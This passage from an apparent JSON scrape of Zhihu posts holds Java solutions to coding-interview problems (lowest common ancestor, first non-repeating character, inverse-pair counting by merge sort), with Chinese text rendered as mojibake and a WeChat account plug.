class=\"k\">return</span> <span class=\"n\">lowestCommonAncestor</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">,</span> <span class=\"n\">p</span><span class=\"o\">,</span> <span class=\"n\">q</span><span class=\"o\">);</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">val</span> <span class=\"o\">&lt;</span> <span class=\"n\">p</span><span class=\"o\">.</span><span class=\"na\">val</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">val</span> <span class=\"o\">&lt;</span> <span class=\"n\">q</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">lowestCommonAncestor</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">,</span> <span class=\"n\">p</span><span class=\"o\">,</span> <span class=\"n\">q</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"n\">root</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h3>æ™®é€šäºŒå‰æ ‘</h3><p><a href=\"https://link.zhihu.com/?target=https%3A//leetcode.com/problems/lowest-common-ancestor-of-a-binary-tree/description/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Leetcode : 236. Lowest Common Ancestor of a Binary Tree</a></p><p>åœ¨å·¦å³å­æ ‘ä¸­æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨ p æˆ–è€… qï¼Œå¦‚æœ p å’Œ q åˆ†åˆ«åœ¨ä¸¤ä¸ªå­æ ‘ä¸­ï¼Œé‚£ä¹ˆå°±è¯´æ˜æ ¹èŠ‚ç‚¹å°±æ˜¯æœ€ä½å…¬å…±ç¥–å…ˆã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-6c6c21a976f21b293af2f6eb3da218bd_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"486\" data-rawheight=\"373\" class=\"origin_image zh-lightbox-thumb\" width=\"486\" data-original=\"https://pic2.zhimg.com/v2-6c6c21a976f21b293af2f6eb3da218bd_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;486&#39; height=&#39;373&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"486\" data-rawheight=\"373\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"486\" data-original=\"https://pic2.zhimg.com/v2-6c6c21a976f21b293af2f6eb3da218bd_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-6c6c21a976f21b293af2f6eb3da218bd_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">TreeNode</span> <span class=\"nf\">lowestCommonAncestor</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">root</span><span class=\"o\">,</span> <span class=\"n\">TreeNode</span> <span class=\"n\">p</span><span class=\"o\">,</span> <span class=\"n\">TreeNode</span> <span class=\"n\">q</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">root</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">root</span> <span class=\"o\">==</span> <span class=\"n\">p</span> <span class=\"o\">||</span> <span class=\"n\">root</span> <span class=\"o\">==</span> <span class=\"n\">q</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">root</span><span class=\"o\">;</span>\n    <span class=\"n\">TreeNode</span> <span class=\"n\">left</span> <span class=\"o\">=</span> <span class=\"n\">lowestCommonAncestor</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">,</span> <span class=\"n\">p</span><span class=\"o\">,</span> <span class=\"n\">q</span><span class=\"o\">);</span>\n    <span class=\"n\">TreeNode</span> <span class=\"n\">right</span> <span class=\"o\">=</span> <span class=\"n\">lowestCommonAncestor</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">,</span> <span class=\"n\">p</span><span class=\"o\">,</span> <span class=\"n\">q</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"n\">left</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">?</span> <span class=\"n\">right</span> <span class=\"o\">:</span> <span class=\"n\">right</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">?</span> <span class=\"n\">left</span> <span class=\"o\">:</span> <span class=\"n\">root</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>å¾®ä¿¡å…¬ä¼—å·</h2><p>ä½ å¯ä»¥åœ¨æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·åå°ä¸æˆ‘äº¤æµã€‚å¦å¤–ï¼Œå…¬ä¼—å·ä¹Ÿæä¾›äº†ä¸€ä»½æŠ€æœ¯é¢è¯•å¤ä¹ å¤§çº²ï¼Œä¸ä»…ç³»ç»Ÿæ•´ç†äº†é¢è¯•çŸ¥è¯†ç‚¹ï¼Œè€Œä¸”æ ‡æ³¨äº†å„ä¸ªçŸ¥è¯†ç‚¹çš„é‡è¦ç¨‹åº¦ï¼Œä»è€Œå¸®ä½ ç†æ¸…å¤šè€Œæ‚çš„é¢è¯•çŸ¥è¯†ç‚¹ï¼Œåå°å›å¤ &#34;å¤§çº²&#34; å³å¯é¢†å–ã€‚æˆ‘åŸºæœ¬æ˜¯æŒ‰ç…§è¿™ä¸ªå¤§çº²æ¥è¿›è¡Œå¤ä¹ çš„ï¼Œå¯¹æˆ‘æ‹¿åˆ°äº† BAT å¤´æ¡ç­‰ Offer èµ·åˆ°å¾ˆå¤§çš„å¸®åŠ©ã€‚ä½ ä»¬å®Œå…¨å¯ä»¥å’Œæˆ‘ä¸€æ ·æ ¹æ®å¤§çº²ä¸Šåˆ—çš„çŸ¥è¯†ç‚¹æ¥è¿›è¡Œå¤ä¹ ï¼Œå°±ä¸ç”¨çœ‹å¾ˆå¤šä¸é‡è¦çš„å†…å®¹ï¼Œä¹Ÿå¯ä»¥çŸ¥é“å“ªäº›å†…å®¹å¾ˆé‡è¦ä»è€Œå¤šå®‰æ’ä¸€äº›å¤ä¹ æ—¶é—´ã€‚å…¬ä¼—å·ä¹Ÿæä¾›äº†è¯¥é¡¹ç›®çš„ç¦»çº¿é˜…è¯»ç‰ˆæœ¬ï¼Œåå°å›å¤ &#34;ä¸‹è½½&#34; å³å¯é¢†å–ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;937&#39; height=&#39;354&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }, 
                {
                    "tag": "ç®—æ³•", 
                    "tagLink": "https://api.zhihu.com/topics/19553510"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/69345998", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 1, 
            "title": "å‰‘æŒ‡ Offer é¢˜è§£ 50-59", 
            "content": "<ul><li><a href=\"https://zhuanlan.zhihu.com/p/69345998/edit#50-%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E5%AD%97%E7%AC%A6%E4%BD%8D%E7%BD%AE\" class=\"internal\">50. ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ä½ç½®</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345998/edit#51-%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%80%86%E5%BA%8F%E5%AF%B9\" class=\"internal\">51. æ•°ç»„ä¸­çš„é€†åºå¯¹</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345998/edit#52-%E4%B8%A4%E4%B8%AA%E9%93%BE%E8%A1%A8%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%85%AC%E5%85%B1%E7%BB%93%E7%82%B9\" class=\"internal\">52. ä¸¤ä¸ªé“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…¬å…±ç»“ç‚¹</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345998/edit#53-%E6%95%B0%E5%AD%97%E5%9C%A8%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0\" class=\"internal\">53. æ•°å­—åœ¨æ’åºæ•°ç»„ä¸­å‡ºç°çš„æ¬¡æ•°</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345998/edit#54-%E4%BA%8C%E5%8F%89%E6%9F%A5%E6%89%BE%E6%A0%91%E7%9A%84%E7%AC%AC-k-%E4%B8%AA%E7%BB%93%E7%82%B9\" class=\"internal\">54. äºŒå‰æŸ¥æ‰¾æ ‘çš„ç¬¬ K ä¸ªç»“ç‚¹</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345998/edit#551-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6\" class=\"internal\">55.1 äºŒå‰æ ‘çš„æ·±åº¦</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345998/edit#552-%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91\" class=\"internal\">55.2 å¹³è¡¡äºŒå‰æ ‘</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345998/edit#56-%E6%95%B0%E7%BB%84%E4%B8%AD%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97\" class=\"internal\">56. æ•°ç»„ä¸­åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345998/edit#571-%E5%92%8C%E4%B8%BA-s-%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%95%B0%E5%AD%97\" class=\"internal\">57.1 å’Œä¸º S çš„ä¸¤ä¸ªæ•°å­—</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345998/edit#572-%E5%92%8C%E4%B8%BA-s-%E7%9A%84%E8%BF%9E%E7%BB%AD%E6%AD%A3%E6%95%B0%E5%BA%8F%E5%88%97\" class=\"internal\">57.2 å’Œä¸º S çš„è¿ç»­æ­£æ•°åºåˆ—</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345998/edit#581-%E7%BF%BB%E8%BD%AC%E5%8D%95%E8%AF%8D%E9%A1%BA%E5%BA%8F%E5%88%97\" class=\"internal\">58.1 ç¿»è½¬å•è¯é¡ºåºåˆ—</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345998/edit#582-%E5%B7%A6%E6%97%8B%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2\" class=\"internal\">58.2 å·¦æ—‹è½¬å­—ç¬¦ä¸²</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345998/edit#59-%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E7%9A%84%E6%9C%80%E5%A4%A7%E5%80%BC\" class=\"internal\">59. æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼</a> </li></ul><h2>50. ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ä½ç½®</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/1c82e8cf713b4bbeb2a5b31cf5b0417c%3FtpId%3D13%26tqId%3D11187%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æ‰¾åˆ°ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ï¼Œå¹¶è¿”å›å®ƒçš„ä½ç½®ã€‚</p><div class=\"highlight\"><pre><code class=\"language-text\">Input: abacc\nOutput: b</code></pre></div><h2>è§£é¢˜æ€è·¯</h2><p>æœ€ç›´è§‚çš„è§£æ³•æ˜¯ä½¿ç”¨ HashMap å¯¹å‡ºç°æ¬¡æ•°è¿›è¡Œç»Ÿè®¡ï¼Œä½†æ˜¯è€ƒè™‘åˆ°è¦ç»Ÿè®¡çš„å­—ç¬¦èŒƒå›´æœ‰é™ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨æ•´å‹æ•°ç»„ä»£æ›¿ HashMapï¼Œä»è€Œå°†ç©ºé—´å¤æ‚åº¦ç”± O(N) é™ä½ä¸º O(1)ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">FirstNotRepeatingChar</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">str</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">cnts</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">256</span><span class=\"o\">];</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">();</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"n\">cnts</span><span class=\"o\">[</span><span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">charAt</span><span class=\"o\">(</span><span class=\"n\">i</span><span class=\"o\">)]++;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">();</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">cnts</span><span class=\"o\">[</span><span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">charAt</span><span class=\"o\">(</span><span class=\"n\">i</span><span class=\"o\">)]</span> <span class=\"o\">==</span> <span class=\"n\">1</span><span class=\"o\">)</span>\n            <span class=\"k\">return</span> <span class=\"n\">i</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"o\">-</span><span class=\"n\">1</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>ä»¥ä¸Šå®ç°çš„ç©ºé—´å¤æ‚åº¦è¿˜ä¸æ˜¯æœ€ä¼˜çš„ã€‚è€ƒè™‘åˆ°åªéœ€è¦æ‰¾åˆ°åªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ï¼Œé‚£ä¹ˆéœ€è¦ç»Ÿè®¡çš„æ¬¡æ•°ä¿¡æ¯åªæœ‰ 0,1,æ›´å¤§ï¼Œä½¿ç”¨ä¸¤ä¸ªæ¯”ç‰¹ä½å°±èƒ½å­˜å‚¨è¿™äº›ä¿¡æ¯ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">FirstNotRepeatingChar2</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">str</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">BitSet</span> <span class=\"n\">bs1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">BitSet</span><span class=\"o\">(</span><span class=\"n\">256</span><span class=\"o\">);</span>\n    <span class=\"n\">BitSet</span> <span class=\"n\">bs2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">BitSet</span><span class=\"o\">(</span><span class=\"n\">256</span><span class=\"o\">);</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">char</span> <span class=\"n\">c</span> <span class=\"o\">:</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">toCharArray</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(!</span><span class=\"n\">bs1</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">c</span><span class=\"o\">)</span> <span class=\"o\">&amp;&amp;</span> <span class=\"o\">!</span><span class=\"n\">bs2</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">c</span><span class=\"o\">))</span>\n            <span class=\"n\">bs1</span><span class=\"o\">.</span><span class=\"na\">set</span><span class=\"o\">(</span><span class=\"n\">c</span><span class=\"o\">);</span>     <span class=\"c1\">// 0 0 -&gt; 0 1\n</span><span class=\"c1\"></span>        <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">bs1</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">c</span><span class=\"o\">)</span> <span class=\"o\">&amp;&amp;</span> <span class=\"o\">!</span><span class=\"n\">bs2</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">c</span><span class=\"o\">))</span>\n            <span class=\"n\">bs2</span><span class=\"o\">.</span><span class=\"na\">set</span><span class=\"o\">(</span><span class=\"n\">c</span><span class=\"o\">);</span>     <span class=\"c1\">// 0 1 -&gt; 1 1\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">();</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">char</span> <span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">charAt</span><span class=\"o\">(</span><span class=\"n\">i</span><span class=\"o\">);</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">bs1</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">c</span><span class=\"o\">)</span> <span class=\"o\">&amp;&amp;</span> <span class=\"o\">!</span><span class=\"n\">bs2</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">c</span><span class=\"o\">))</span>  <span class=\"c1\">// 0 1\n</span><span class=\"c1\"></span>            <span class=\"k\">return</span> <span class=\"n\">i</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"o\">-</span><span class=\"n\">1</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>51. æ•°ç»„ä¸­çš„é€†åºå¯¹</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/96bd6684e04a44eb80e6a68efc0ec6c5%3FtpId%3D13%26tqId%3D11188%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>åœ¨æ•°ç»„ä¸­çš„ä¸¤ä¸ªæ•°å­—ï¼Œå¦‚æœå‰é¢ä¸€ä¸ªæ•°å­—å¤§äºåé¢çš„æ•°å­—ï¼Œåˆ™è¿™ä¸¤ä¸ªæ•°å­—ç»„æˆä¸€ä¸ªé€†åºå¯¹ã€‚è¾“å…¥ä¸€ä¸ªæ•°ç»„ï¼Œæ±‚å‡ºè¿™ä¸ªæ•°ç»„ä¸­çš„é€†åºå¯¹çš„æ€»æ•°ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"kt\">long</span> <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n<span class=\"kd\">private</span> <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">tmp</span><span class=\"o\">;</span>  <span class=\"c1\">// åœ¨è¿™é‡Œå£°æ˜è¾…åŠ©æ•°ç»„ï¼Œè€Œä¸æ˜¯åœ¨ merge() é€’å½’å‡½æ•°ä¸­å£°æ˜\n</span><span class=\"c1\"></span>\n<span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">InversePairs</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">tmp</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">];</span>\n    <span class=\"n\">mergeSort</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">)</span> <span class=\"o\">(</span><span class=\"n\">cnt</span> <span class=\"o\">%</span> <span class=\"n\">1000000007</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">mergeSort</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">l</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">h</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">h</span> <span class=\"o\">-</span> <span class=\"n\">l</span> <span class=\"o\">&lt;</span> <span class=\"n\">1</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">m</span> <span class=\"o\">=</span> <span class=\"n\">l</span> <span class=\"o\">+</span> <span class=\"o\">(</span><span class=\"n\">h</span> <span class=\"o\">-</span> <span class=\"n\">l</span><span class=\"o\">)</span> <span class=\"o\">/</span> <span class=\"n\">2</span><span class=\"o\">;</span>\n    <span class=\"n\">mergeSort</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"n\">l</span><span class=\"o\">,</span> <span class=\"n\">m</span><span class=\"o\">);</span>\n    <span class=\"n\">mergeSort</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"n\">m</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">h</span><span class=\"o\">);</span>\n    <span class=\"n\">merge</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"n\">l</span><span class=\"o\">,</span> <span class=\"n\">m</span><span class=\"o\">,</span> <span class=\"n\">h</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">merge</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">l</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">m</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">h</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">l</span><span class=\"o\">,</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">m</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">l</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">m</span> <span class=\"o\">||</span> <span class=\"n\">j</span> <span class=\"o\">&lt;=</span> <span class=\"n\">h</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">&gt;</span> <span class=\"n\">m</span><span class=\"o\">)</span>\n            <span class=\"n\">tmp</span><span class=\"o\">[</span><span class=\"n\">k</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">++];</span>\n        <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">j</span> <span class=\"o\">&gt;</span> <span class=\"n\">h</span><span class=\"o\">)</span>\n            <span class=\"n\">tmp</span><span class=\"o\">[</span><span class=\"n\">k</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">++];</span>\n        <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">&lt;=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">])</span>\n            <span class=\"n\">tmp</span><span class=\"o\">[</span><span class=\"n\">k</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">++];</span>\n        <span class=\"k\">else</span> <span class=\"o\">{</span>\n            <span class=\"n\">tmp</span><span class=\"o\">[</span><span class=\"n\">k</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">++];</span>\n            <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">cnt</span> <span class=\"o\">+=</span> <span class=\"n\">m</span> <span class=\"o\">-</span> <span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">;</span>  <span class=\"c1\">// nums[i] &gt; nums[j]ï¼Œè¯´æ˜ nums[i...mid] éƒ½å¤§äº nums[j]\n</span><span class=\"c1\"></span>        <span class=\"o\">}</span>\n        <span class=\"n\">k</span><span class=\"o\">++;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">l</span><span class=\"o\">;</span> <span class=\"n\">k</span> <span class=\"o\">&lt;=</span> <span class=\"n\">h</span><span class=\"o\">;</span> <span class=\"n\">k</span><span class=\"o\">++)</span>\n        <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">k</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">tmp</span><span class=\"o\">[</span><span class=\"n\">k</span><span class=\"o\">];</span>\n<span class=\"o\">}</span></code></pre></div><h2>52. ä¸¤ä¸ªé“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…¬å…±ç»“ç‚¹</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/6ab1d9a29e88450685099d45c9e31e46%3FtpId%3D13%26tqId%3D11189%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-e9a1e3287939b45c46d3db9a7a0933c6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"902\" data-rawheight=\"229\" 